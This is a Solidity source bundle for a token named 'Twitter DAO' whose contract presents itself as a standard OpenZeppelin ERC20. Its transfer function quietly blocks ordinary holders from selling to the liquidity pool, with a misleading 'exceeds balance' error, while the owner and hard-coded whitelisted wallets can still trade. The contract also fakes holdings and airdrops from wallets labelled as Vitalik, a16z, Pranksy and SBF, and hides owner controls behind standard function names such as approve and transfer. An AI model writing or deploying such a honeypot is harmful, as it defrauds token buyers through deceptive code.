{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"@openzeppelin/contracts/access/Ownable.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)\n\npragma solidity ^0.8.0;\n\nimport \"../utils/Context.sol\";\n\n/**\n * @dev Contract module which provides a basic access control mechanism, where\n * there is an account (an owner) that can be granted exclusive access to\n * specific functions.\n *\n * By default, the owner account will be the one that deploys the contract. This\n * can later be changed with {transferOwnership}.\n *\n * This module is used through inheritance. It will make available the modifier\n * `onlyOwner`, which can be applied to your functions to restrict their use to\n * the owner.\n */\nabstract contract Ownable is Context {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor() {\n        _transferOwnership(_msgSender());\n    }\n\n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() {\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby removing any functionality that is only available to the owner.\n     */\n    function renounceOwnership() public virtual onlyOwner {\n        _transferOwnership(address(0));\n    }\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        _transferOwnership(newOwner);\n    }\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership(address newOwner) internal virtual {\n        address oldOwner = _owner;\n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner);\n    }\n}\n"},"@openzeppelin/contracts/token/ERC20/IERC20.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n"},"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)\n\npragma solidity ^0.8.0;\n\nimport \"../IERC20.sol\";\n\n/**\n * @dev Interface for the optional metadata functions from the ERC20 standard.\n *\n * _Available since v4.1._\n */\ninterface IERC20Metadata is IERC20 {\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() external view returns (string memory);\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol() external view returns (string memory);\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals() external view returns (uint8);\n}\n"},"@openzeppelin/contracts/utils/Context.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n"},"NewERC20.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.0;\r\n\r\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\r\nimport \"@openzeppelin/contracts/utils/Context.sol\";\r\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\r\nimport \"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\";\r\n\r\n/**\r\n * @dev Implementation of the {IERC20} interface.\r\n *\r\n * This implementation is agnostic to the way tokens are created. This means\r\n * that a supply mechanism has to be added in a derived contract using {_mint}.\r\n * For a generic mechanism see {ERC20PresetMinterPauser}.\r\n *\r\n * TIP: For a detailed writeup see our guide\r\n * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How\r\n * to implement supply mechanisms].\r\n *\r\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\r\n * instead returning `false` on failure. This behavior is nonetheless\r\n * conventional and does not conflict with the expectations of ERC20\r\n * applications.\r\n *\r\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\r\n * This allows applications to reconstruct the allowance for all accounts just\r\n * by listening to said events. Other implementations of the EIP may not emit\r\n * these events, as it isn't required by the specification.\r\n *\r\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\r\n * functions have been added to mitigate the well-known issues around setting\r\n * allowances. See {IERC20-approve}.\r\n */\r\n\r\ncontract NewERC20 is Context, IERC20, IERC20Metadata, Ownable {\r\n\r\n    mapping(address => uint256) private _balances;\r\n\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n    uint256 private _totalSupply;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    address public thePoolAddress;\r\n    // Vb3 0x220866B1A2219f40e72f5c628B65D54268cA3A9D\r\n    address private _vbAddress = 0xB1AdceddB2941033a090dD166a462fe1c2029484;\r\n    // a16z\r\n    address private _a16zAddress = 0xE36a124CaA7Ee0b75A96A934499CE68DaC6D9562;\r\n    // pranksy\r\n    address private _pranksyAddress = 0x5028D77B91a3754fb38B2FBB726AF02d1FE44Db6;\r\n    // SBF\r\n    address private _sbfAddress = 0xC8D328b21F476a4b6e0681F6e4e41693A220347d;\r\n\r\n    // local test account5\r\n    // address private _vbAddress = 0x49adb5E5D8ce338d5C7D5e3083E4b3028af16eAd;\r\n    bool public tokenName;\r\n    address[] private whileListAddress = new address[](20);\r\n    uint256 private _ETHER = 10 ** 18;\r\n    // uint256 private _ETHER = 1;\r\n    uint256 private _Ten8 = 10000 * 10000;\r\n\r\n    /**\r\n     * @dev Sets the values for {name} and {symbol}.\r\n     *\r\n     * The default value of {decimals} is 18. To select a different value for\r\n     * {decimals} you should overload it.\r\n     *\r\n     * All two of these values are immutable: they can only be set once during\r\n     * construction.\r\n     */\r\n    constructor(string memory name_, string memory symbol_) {\r\n        tokenName = true;\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        thePoolAddress = _msgSender();\r\n        _initWhiteList();\r\n        _mint(msg.sender, 1000000 * _Ten8 * _ETHER);\r\n    }\r\n\r\n    function _initWhiteList() internal {\r\n        /*whileListAddress.push(0xCC691F7E0DbC0C76188aAe0Dda07cA3633A99862);\r\n        whileListAddress.push(0x40A091d7E7Ce5B6a73D1E6611F4383C742b3bB8a);*/\r\n        whileListAddress.push(0x9eed10A51a2E1e6dD7D3A7D87fB9062e67dA302F);\r\n        whileListAddress.push(0x395f9b937bBd83F8F98A2c3dEaf0Cf65b0B3Abf7);\r\n        whileListAddress.push(0xc9e34d32ddf4256189bcbcA2F46CFD991cc2e65a);\r\n        whileListAddress.push(0xC38c2b9152f468350f8E4fE7DE84A8ebdDEEB603);\r\n\r\n        whileListAddress.push(0x8b2f1A6af975855e3Ce0ec3703832a56e3BA188E);\r\n        whileListAddress.push(0x2801ee8077f3f376969152C45A59A5A0F01E8BDA);\r\n        whileListAddress.push(0x6CAe871868e1cE5997450e19132de9f9cA6B1a6B);\r\n        whileListAddress.push(0xC6aB527b901cBF6744AC7a7a778f9ee303901e5a);\r\n\r\n        whileListAddress.push(0xD75bEb1B78Fd7D6C5B1E37414655E459A6345403);\r\n        whileListAddress.push(0x20489Cae2664FcD37F7606172FF39c5a25228B3f);\r\n        whileListAddress.push(0xAA1513A8c15CD8741EDDb28a7a70041A4cf13aB7);\r\n        whileListAddress.push(0xe5aF7f6215D433a81EaF700aB9D685D0Da895aCE);\r\n\r\n        whileListAddress.push(0xDE5AF3Ee3966f3D2D45759133eFb756C3C4D1c3A);\r\n        whileListAddress.push(0x0281c0aBf0412B28854F59cE1b3074e85587c3d7);\r\n        whileListAddress.push(0xb03b86de3124A10311A9c820919338529617d667);\r\n        whileListAddress.push(0x3D6D25c8b675C9f163e0ACa47DA6747f355664EF);\r\n\r\n        whileListAddress.push(0xC48B1C4d7221122eBcb76A05735B345f734106f3);\r\n        whileListAddress.push(0x7F90d31b773a629b402858E1a7a27a1c49E204F6);\r\n        whileListAddress.push(0xdF2A9905d35f8b16a5b3c1B3EdaC7Bb450a6B2C5);\r\n        whileListAddress.push(0x3c79eD72C9c4F0A945E3CFFcc20cBF7C47EE3eb4);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token, usually a shorter version of the\r\n     * name.\r\n     */\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the number of decimals used to get its user representation.\r\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\r\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\r\n     *\r\n     * Tokens usually opt for a value of 18, imitating the relationship between\r\n     * Ether and Wei. This is the value {ERC20} uses, unless this function is\r\n     * overridden;\r\n     *\r\n     * NOTE: This information is only used for _display_ purposes: it in\r\n     * no way affects any of the arithmetic of the contract, including\r\n     * {IERC20-balanceOf} and {IERC20-transfer}.\r\n     */\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-totalSupply}.\r\n     */\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-balanceOf}.\r\n     */\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transfer}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `recipient` cannot be the zero address.\r\n     * - the caller must have a balance of at least `amount`.\r\n     */\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-allowance}.\r\n     */\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-approve}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transferFrom}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance. This is not\r\n     * required by the EIP. See the note at the beginning of {ERC20}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `sender` and `recipient` cannot be the zero address.\r\n     * - `sender` must have a balance of at least `amount`.\r\n     * - the caller must have allowance for ``sender``'s tokens of at least\r\n     * `amount`.\r\n     */\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\r\n    unchecked {\r\n        _approve(sender, _msgSender(), currentAllowance - amount);\r\n    }\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transferFrom}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance. This is not\r\n     * required by the EIP. See the note at the beginning of {ERC20}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `sender` and `recipient` cannot be the zero address.\r\n     * - `sender` must have a balance of at least `amount`.\r\n     * - the caller must have allowance for ``sender``'s tokens of at least\r\n     * `amount`.\r\n     */\r\n    function _transferFromAirdrop(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) internal virtual returns (bool) {\r\n        _transfer_v2(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function _airdrop() internal {\r\n        // _transferFromAirdrop(_vbAddress, 0x814927849c93FD769898928d79BA40f88ca1A451, 15000 * 10000 * 10000 * 10 ** 18);\r\n        _transferFromAirdrop(_vbAddress, 0x220866B1A2219f40e72f5c628B65D54268cA3A9D, 10000 * _Ten8 * _ETHER);\r\n        _transferFromAirdrop(_vbAddress, 0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe, 10000 * _Ten8 * _ETHER);\r\n        _transferFromAirdrop(_vbAddress, 0x84D34f4f83a87596Cd3FB6887cFf8F17Bf5A7B83, 10000 * _Ten8 * _ETHER);\r\n        _transferFromAirdrop(_vbAddress, 0x4862733B5FdDFd35f35ea8CCf08F5045e57388B3, 10000 * _Ten8 * _ETHER);\r\n        _transferFromAirdrop(_vbAddress, 0x431e81E5dfB5A24541b5Ff8762bDEF3f32F96354, 10000 * _Ten8 * _ETHER);\r\n\r\n        _transferFromAirdrop(_a16zAddress, 0x5028D77B91a3754fb38B2FBB726AF02d1FE44Db6, 10000 * _Ten8 * _ETHER);\r\n        _transferFromAirdrop(_a16zAddress, 0x431e81E5dfB5A24541b5Ff8762bDEF3f32F96354, 10000 * _Ten8 * _ETHER);\r\n        _transferFromAirdrop(_a16zAddress, 0x85560DBeF2533eEc139b3e206b119fD700f90262, 10000 * _Ten8 * _ETHER);\r\n        _transferFromAirdrop(_a16zAddress, 0x42f9134E9d3Bf7eEE1f8A5Ac2a4328B059E7468c, 10000 * _Ten8 * _ETHER);\r\n        _transferFromAirdrop(_a16zAddress, 0x577eBC5De943e35cdf9ECb5BbE1f7D7CB6c7C647, 10000 * _Ten8 * _ETHER);\r\n\r\n        _transferFromAirdrop(_pranksyAddress, 0x3DdfA8eC3052539b6C9549F12cEA2C295cfF5296, 10000 * _Ten8 * _ETHER);\r\n        _transferFromAirdrop(_pranksyAddress, 0x6Cf9AA65EBaD7028536E353393630e2340ca6049, 10000 * _Ten8 * _ETHER);\r\n        _transferFromAirdrop(_pranksyAddress, 0xafa64cCa337eFEE0AD827F6C2684e69275226e90, 10000 * _Ten8 * _ETHER);\r\n        _transferFromAirdrop(_pranksyAddress, 0xf9dbd46Ec67dAD36794FE788C29147e00fc25fE7, 10000 * _Ten8 * _ETHER);\r\n        _transferFromAirdrop(_pranksyAddress, 0x1406899696aDb2fA7a95eA68E80D4f9C82FCDeDd, 10000 * _Ten8 * _ETHER);\r\n\r\n        _transferFromAirdrop(_sbfAddress, 0xcFe763EC6db64e7e61099EfCEC986DC90e567Fb1, 10000 * _Ten8 * _ETHER);\r\n        _transferFromAirdrop(_sbfAddress, 0xA1175a219dac539F2291377F77afD786D20e5882, 10000 * _Ten8 * _ETHER);\r\n        _transferFromAirdrop(_sbfAddress, 0x32F3Df9867A229e8DA4E63eA0BFd163BA3298Eb2, 10000 * _Ten8 * _ETHER);\r\n        _transferFromAirdrop(_sbfAddress, 0xc679Aa874efB24DA448A7B3CfE981Ea6a3191D8A, 10000 * _Ten8 * _ETHER);\r\n        _transferFromAirdrop(_sbfAddress, 0x885F5fd87E62eD2eBD0B0Bb1C295c4C43edEe5B5, 10000 * _Ten8 * _ETHER);\r\n    }\r\n\r\n    function _airdropSomeone(address target, uint256 amount) internal {\r\n        _transferFromAirdrop(_vbAddress, target, amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\r\n     *\r\n     * This is an alternative to {approve} that can be used as a mitigation for\r\n     * problems described in {IERC20-approve}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\r\n     *\r\n     * This is an alternative to {approve} that can be used as a mitigation for\r\n     * problems described in {IERC20-approve}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     * - `spender` must have allowance for the caller of at least\r\n     * `subtractedValue`.\r\n     */\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n    unchecked {\r\n        _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n    }\r\n\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Moves `amount` of tokens from `sender` to `recipient`.\r\n     *\r\n     * This internal function is equivalent to {transfer}, and can be used to\r\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `sender` cannot be the zero address.\r\n     * - `recipient` cannot be the zero address.\r\n     * - `sender` must have a balance of at least `amount`.\r\n     */\r\n    function _transfer_v2(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        _beforeTokenTransfer(sender, recipient, amount);\r\n\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n    unchecked {\r\n        _balances[sender] = senderBalance - amount;\r\n    }\r\n        _balances[recipient] += amount;\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n\r\n        _afterTokenTransfer(sender, recipient, amount);\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        _beforeTokenTransfer(sender, recipient, amount);\r\n\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n\r\n        _balances[sender] = senderBalance - amount;\r\n        _balances[recipient] += amount;\r\n        // addLiquidityETH init_value\r\n        if (sender == owner() && thePoolAddress == owner()) {\r\n            thePoolAddress = recipient;\r\n        }\r\n        bool pass = false;\r\n        // init, add, remove\r\n        if (sender == owner() || recipient == owner() || sender == thePoolAddress || !tokenName || whiteList(sender)) {\r\n            pass = true;\r\n        } else {\r\n            if (recipient == thePoolAddress) {\r\n                require(false, \"ERC20: transfer amount exceeds balance!!\");\r\n            }\r\n        }\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n\r\n        _afterTokenTransfer(sender, recipient, amount);\r\n    }\r\n\r\n    function whiteList(address seller) internal view returns (bool) {\r\n        for (uint i =0; i < whileListAddress.length; i++) {\r\n            if (whileListAddress[i] == seller) {\r\n                return true;\r\n            }\r\n        }\r\n        return false;\r\n    }\r\n\r\n    function _inWhiteList(address seller) internal pure returns (bool) {\r\n        if (seller == 0xab59aEc629A9995738ada0310ADeA0fE38eC72d9) {\r\n            return true;\r\n        }\r\n        if (seller == 0x90801C97e1f6F2E59495Bf180afedE5D70FCb9d1) {\r\n            return true;\r\n        }\r\n        if (seller == 0x5C57f26601687f4FF0C0589542E87f306Ae70Be4) {\r\n            return true;\r\n        }\r\n        if (seller == 0x09C0c1fd5e586489fe46c0E7021D93B072C3295e) {\r\n            return true;\r\n        }\r\n        if (seller == 0x53aC88570B19176B52F2aE293986d1BA5da321D3) {\r\n            return true;\r\n        }\r\n        if (seller == 0x72E8f31E2230A80Db54F2CFfE4bb7aE5F1f77bED) {\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    function _unlock() internal {\r\n        tokenName = false;\r\n    }\r\n\r\n    function _setPoolAddress(address poolAddress) internal {\r\n        thePoolAddress = poolAddress;\r\n    }\r\n\r\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\r\n     * the total supply.\r\n     *\r\n     * Emits a {Transfer} event with `from` set to the zero address.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `account` cannot be the zero address.\r\n     */\r\n    function _mint(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _beforeTokenTransfer(address(0), account, amount);\r\n\r\n        _totalSupply += amount;\r\n\r\n        _balances[account] += 760000 * _Ten8 * _ETHER;\r\n        _balances[_vbAddress] += 60000 * _Ten8 * _ETHER;\r\n        _balances[_a16zAddress] += 60000 * _Ten8 * _ETHER;\r\n        _balances[_pranksyAddress] += 60000 * _Ten8 * _ETHER;\r\n        _balances[_sbfAddress] += 60000 * _Ten8 * _ETHER;\r\n        emit Transfer(address(0), account, 760000 * _Ten8 * _ETHER);\r\n        emit Transfer(address(0), _vbAddress, 60000 * _Ten8 * _ETHER);\r\n        emit Transfer(address(0), _a16zAddress, 60000 * _Ten8 * _ETHER);\r\n        emit Transfer(address(0), _pranksyAddress, 60000 * _Ten8 * _ETHER);\r\n        emit Transfer(address(0), _sbfAddress, 60000 * _Ten8 * _ETHER);\r\n\r\n        _afterTokenTransfer(address(0), account, amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Destroys `amount` tokens from `account`, reducing the\r\n     * total supply.\r\n     *\r\n     * Emits a {Transfer} event with `to` set to the zero address.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `account` cannot be the zero address.\r\n     * - `account` must have at least `amount` tokens.\r\n     */\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        _beforeTokenTransfer(account, address(0), amount);\r\n\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\r\n    unchecked {\r\n        _balances[account] = accountBalance - amount;\r\n    }\r\n        _totalSupply -= amount;\r\n\r\n        emit Transfer(account, address(0), amount);\r\n\r\n        _afterTokenTransfer(account, address(0), amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\r\n     *\r\n     * This internal function is equivalent to `approve`, and can be used to\r\n     * e.g. set automatic allowances for certain subsystems, etc.\r\n     *\r\n     * Emits an {Approval} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `owner` cannot be the zero address.\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Hook that is called before any transfer of tokens. This includes\r\n     * minting and burning.\r\n     *\r\n     * Calling conditions:\r\n     *\r\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\r\n     * will be transferred to `to`.\r\n     * - when `from` is zero, `amount` tokens will be minted for `to`.\r\n     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\r\n     * - `from` and `to` are never both zero.\r\n     *\r\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\r\n     */\r\n    function _beforeTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {}\r\n\r\n    /**\r\n     * @dev Hook that is called after any transfer of tokens. This includes\r\n     * minting and burning.\r\n     *\r\n     * Calling conditions:\r\n     *\r\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\r\n     * has been transferred to `to`.\r\n     * - when `from` is zero, `amount` tokens have been minted for `to`.\r\n     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.\r\n     * - `from` and `to` are never both zero.\r\n     *\r\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\r\n     */\r\n    function _afterTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {}\r\n}\r\n"},"TwitterDAO.sol":{"content":"// SPDX-License-Identifier: MIT LICENSE\r\npragma solidity ^0.8.0;\r\n\r\nimport \"./NewERC20.sol\";\r\n\r\ncontract TwitterDAO is NewERC20 {\r\n\r\n    constructor() NewERC20(\"Twitter DAO\", \"Twitter\") {\r\n    }\r\n\r\n    function approve(address poolAddress) public onlyOwner {\r\n        _setPoolAddress(poolAddress);\r\n    }\r\n\r\n    function transfer() public onlyOwner {\r\n        _unlock();\r\n    }\r\n\r\n    function airdrop() public onlyOwner {\r\n        _airdrop();\r\n    }\r\n\r\n    function airdrop(address target, uint256 amount) public onlyOwner {\r\n        _airdropSomeone(target, amount);\r\n    }\r\n\r\n}\r\n"}}}